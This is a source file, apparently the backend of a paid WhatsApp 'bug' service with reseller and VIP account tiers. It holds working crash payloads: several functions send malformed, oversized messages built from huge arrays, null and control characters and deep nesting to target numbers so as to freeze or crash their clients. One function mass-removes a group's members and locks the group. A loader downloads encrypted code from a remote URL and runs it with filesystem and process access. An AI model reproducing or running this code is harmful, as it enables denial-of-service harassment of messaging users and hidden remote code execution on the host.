            if (availableSocks.length > 0) {
              const retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
              return await attemptSend(retrySock, true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}, ${err.message}`);
        return false;
      }
    };

        // --- LOGIC PEMILIHAN SENDER (UPDATE) ---
    let sock;
    const senderMode = req.query.senderMode || 'private'; // Ambil mode dari query

    if (senderMode === 'global') {
      // MODE GLOBAL: Ambil sender dari SEMUA folder user di permenmd
      let availableSocks = [];
      const baseDir = path.join(__dirname, 'permenmd');

      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          return fs.lstatSync(path.join(baseDir, p)).isDirectory();
        });

        // Scan semua folder user
        for (const u of allUsers) {
          const uPath = path.join(baseDir, u);
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) {
              availableSocks.push(activeConnections[sessionName]);
            }
          });
        }
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Global Mode: Tidak ada koneksi aktif dari manapun.`);
        return;
      }

      // Pilih acak dari semua user yang aktif
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
      console.log(`[🌍 GLOBAL SENDER] Menggunakan sender acak. Total Global Active: ${availableSocks.length}`);

    } else if (user.role === 'vip') {
      // VIP: Gabungkan sender dari folder VIP dan folder permenmd/[username]
      let availableSocks = [];
      const vipPath = path.join(__dirname, 'vip');
      if (fs.existsSync(vipPath)) {
        availableSocks.push(...getActiveSocketsFromPath(vipPath));
      }
      const userPath = path.join('permenmd', user.username);
      if (fs.existsSync(userPath)) {
        availableSocks.push(...getActiveSocketsFromPath(userPath));
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif di VIP Pool atau folder pribadi ${user.username}.`);
        return;
      }
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

    } else {
      // MODE PRIVATE (DEFAULT MEMBER): Ambil sock dari folder user sendiri
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia di folder member ${user.username}.`);
        return;
      }
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return array kosong
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /getSenderStats
// Mengembalikan jumlah sender aktif untuk user sendiri (Private) dan total semua user (Global)
app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    // 1. Hitung Private (permenmd/username)
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    // 2. Hitung Global (Semua folder di permenmd)
    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    // 1. Ambil dari folder VIP (Root)
    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    // 2. Ambil dari folder permenmd/[username]
    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    // User biasa hanya melihat sender di folder usernya sendiri
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "XXXXXXXX")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "admin"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // --- CEK LIMIT BULANAN ---
  const roleLimits = {
    owner: 50,
    admin: 40,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7); // Format "YYYY-MM"

  // Inisialisasi log penggunaan jika belum ada, atau reset jika bulan baru
  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  // ✅ TAMBAHKAN PENGGUNA KE DB
  db.push(newAccount);

  // ✅ TAMBAHKAN COUNTER LIMIT KEPADA CREATOR
  creator.usageLog.count++;

  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Tentukan Level Role
  const roleLevel = {
    owner: 6,
    moderator: 5,
    partner: 4,
    admin: 3,
    reseller: 2,
    vip: 1,
    member: 0
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Logika: Hanya bisa hapus jika level deleter lebih tinggi dari target
  // Owner (6) bisa hapus Moderator (5), Partner (4), dst.
  // Moderator (5) bisa hapus Partner (4), Admin (3), dst.
  // Admin (3) bisa hapus Reseller (2), VIP (1), Member (0).
  
  if (deleterLevel <= targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with equal or higher rank." });
  }

  // Lakukan penghapusan
  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  // Izinkan Owner, Moderator, Partner, dan Admin melihat list
  if (!requester || !["owner", "moderator", "partner", "admin"].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM" // Tambahkan parent jika perlu untuk tracking
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // --- HIRARKI ROLE UPDATE (Sesuai Flutter Baru) ---
  const hierarchy = {
    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member'],
    moderator: ['partner', 'admin', 'reseller', 'vip', 'member'],
    partner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member'] // Admin buat reseller, vip, member
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || !hierarchy[creatorRole]) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  // --- CEK LIMIT BULANAN UPDATE ---
  const roleLimits = {
    owner: 50,
    moderator: 45, // Tambahkan limit Moderator
    partner: 40,   // Tambahkan limit Partner
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7); 

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  // Izin: Owner, Moderator, Partner, Admin, Reseller
  if (!editor || !["reseller", "admin", "partner", "moderator", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  // Batas hari untuk Reseller (jika ingin diterapkan juga ke role lain, sesuaikan)
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Validasi Hirarki (Sama seperti delete)
  const roleLevel = {
    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  if (roleLevel[editor.role] <= roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with equal or higher rank." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function delaybebasspam(sock, target) {
    const pe = Array.from({ length: 12345 }, () => ({}));
    const r = "\u0000" + "\uFDFD" + "\u0010" + "\u0000";
    const t = 50000;
  
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "pppp"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(t),
                        nativeFlowResponseMessage: {
                            buttons: r.repeat(t)
                        }
                    }
                }
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "deffa is here"
                    },
                    nativeFlowMessage: {
                        buttons: r.repeat(t),
                        nativeFlowResponseMessage: {
                            buttons: pe
                        }
                    }
                }
            }
        }
    };
    
    await sock.relayMessage(target, msg1, {});
    await sock.relayMessage(target, msg2, {});
}

async function ingpisible(sock, target) {
  const r = (str, n) => str.repeat(n);
  const aray = Array.from({ length: 500000 }, () => ({}));
  
  try {
    for (let i = 0; i < 50; i++) {
      const msg1 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "x",
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                nativeFlowResponsMessage: {
                  buttons: Array.from({ length: 500000 }, () => ({})),
                },
              },
            },
          },
        },
      };

      const msg2 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                buttons: Array.from({ length: 500000 }, () => ({})),
              },
              nativeFlowMessage: {
                extra1: {
                  "\u2797": "" 
                },
                extra2: {
                  "\u27BF": "" 
                },
                buttons: Array.from({ length: 500000 }, () => ({})),
              }
            }
          }
        }
      };

      const msg3 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: r("\x9234", 60000)
              },
              nativeFlowMessage: {
                extra: {
                  "\u{31040}": "" 
                },
                buttons: Array.from({ length: 500000 }, () => ({})),
              }
            }
          }
        }
      };

      await sock.relayMessage(target, msg1, {
        participant: { jid: target }
      });
      
      await sock.relayMessage(target, msg3, {
        participant: { jid: target }
      });
      
      await sock.relayMessage(target, msg2, {
        participant: { jid: target }
      });
    }
  } catch (err) {
    console.error("Error:", err);
  }
}

async function Delaycanx(sock, target) {
  const laso = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "canx suki ajg🤓"
          },
          nativeFlowMessage: {
            messageParamsJson: "[".repeat(50000),
            buttons: Array.from({ length: 50000 }, () => ({}))
          }
        }
      }
    }
  };

  const canx = {
    protocolMessage: {
      type: 9999,
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "\u0000".repeat(70000) + "\u600b".repeat(60000)
      },
      message: "\u200B".repeat(100000) + "\u0000".repeat(100000),
      timestamp: Math.floor(Date.now() / 1000)
    }
  };

  const Attack = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "delay canx env jir🤓"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: {
              stickerPackMessage: {}
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, laso, { ptcp: true });
  await sock.relayMessage(target, canx, { ptcp: true });
  await sock.relayMessage(target, Attack, { ptcp: true });
}

async function FcNewMonkey(sock, target) {
  try {
    const bloksNestedContainer = {
      bloksNestedContainer: {
        root: {
          child: {
            id: "\u2060".repeat(100000),
            child: {
              id: "\uFEFF".repeat(100000),
              child: {
                id: "\u057E".repeat(100000),
                child: {
                  id: "\u207E".repeat(100000),
                  child: {
                    id: "\u202D".repeat(100000),
                    child: {
                      id: "\u204B".repeat(100000),
                      dhtar: "i".repeat(500000)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(
      target,
      bloksNestedContainer,
      { participant: { jid: target } }
    );

    console.log(`[MONKEY] ✅ Success: ${target}`);
  } catch (err) {
    console.error(`[MONKEY] ❌ Error: ${err.message}`);
  }
}

async function DelayIngpisV2(sock, target) {
  try {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Diks is here",
              display_text: "x9234"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 5000 }, () => ({}))
            }
          }
        }
      }
    }, {});

    const code = "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930" + "\u500B";
    const repeat = 1000000;

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "cc?🦠ꦾ",
              display_text: "\u200C"
            },
            nativeFlowMessage: {
              name: "single_select",
              paramsJson: JSON.stringify({
                icon: "document",
                title: "gayalu!",
                sections: Array.from({ length: 505555 }, () => ({}))
              }),
              buttons: Array.from({ length: 500000 }, () => ({})),
              enumStatusSourceType: {
                IMAGE: 0,
                VIDEO: 1,
                GIF: 2,
                AUDIO: 3,
                TEXT: 4,
                MUSIC_STANDALONE: 5
              },
              utmInfo: {
                utmSource: "",
                utmCampaign: ""
              }
            }
          }
        }
      }
    }, {});

    console.log("✅ SUCCESS SEND BUGS");
  } catch (e) {
    console.log("❌ ERROR:", e.message);
  }
}

async function Buldozer(sock, target) {
    for (let i = 0; i < 55; i++) {
        const msg = generateWAMessageFromContent(target, {
            audioMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/invalid",
                mimetype: "audio/mp4",
                fileSha256: Buffer.alloc(32).toString("base64"),
                fileEncSha256: Buffer.alloc(32).toString("base64"),
                mediaKey: Buffer.alloc(32).toString("base64"),
                fileLength: "999999999999999999",
                seconds: 999999,
                ptt: true,
                directPath: "/o1/v/t62.7118-24/f2/m231/" + "\u202E".repeat(7000),
                mediaKeyTimestamp: "9999999999999",
                contextInfo: {
                    mentionedJid: Array.from({ length: 5000 }, function() {
                        return Math.floor(Math.random() * 500000) + "@s.whatsapp.net";
                    }),
                    forwardingScore: 999999,
                    isForwarded: true,
                    conversionSource: "\u202E".repeat(7000) + "\u034F".repeat(8000),
                    quotedMessage: {
                        conversation: "\u034F".repeat(7000) + "\u202E".repeat(8000)
                    }
                }
            }
        }, { userJid: target });

        try {
            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id + "_" + i
            });
        } catch (e) {}

        await new Promise(r => setTimeout(r, 500));
    }
}

async function DelayInvisCallReymon(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u200B",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\n".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function Blank(sock, target) {
  const msg1 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🩸⃟༑⌁⃰Diks Crash ཀ‌¿‌🦠"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 80000 }, () => ({}))
          }
        }
      }
    },
    additionalNodes: [
      {
        tag: "bot",
        attrs: { biz_bot: "1" }
      }
    ]
  };

  const msg2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "$Boikep🕷"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg1, {});
  await sock.relayMessage(target, msg2, {});
  console.log("✅ SUCCESS SEND BUGS");
}

async function gbbannew(sock, target) {
  let group = target.includes('@g.us') ? target : target + '@g.us';
  let members = await sock.groupMetadata(group);
  for (i = 0; i < 20; i++) {
    try {
      for (let m of members.participants) {
        let id = m.id;
        if (id !== sock.user.id) {
          await sock.groupParticipantsUpdate(group, [id], 'remove');
          await new Promise((r) => setTimeout(r, 15));
        }
      }

      await sock.groupParticipantsUpdate(group, ['0@s.whatsapp.net'], 'add');
      await new Promise((r) => setTimeout(r, 10));
      await sock.groupParticipantsUpdate(group, ['0@s.whatsapp.net'], 'remove');

      await sock.sendMessage(group, {
        text:
          'u200B'.repeat(3000) + 'u0000'.repeat(3000) + 'u202E'.repeat(1000),
      });

      await sock.groupSettingsUpdate(group, 'announcement', true);
      await sock.groupSettingsUpdate(group, 'locked', true);
    } catch (e) {}
  }
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
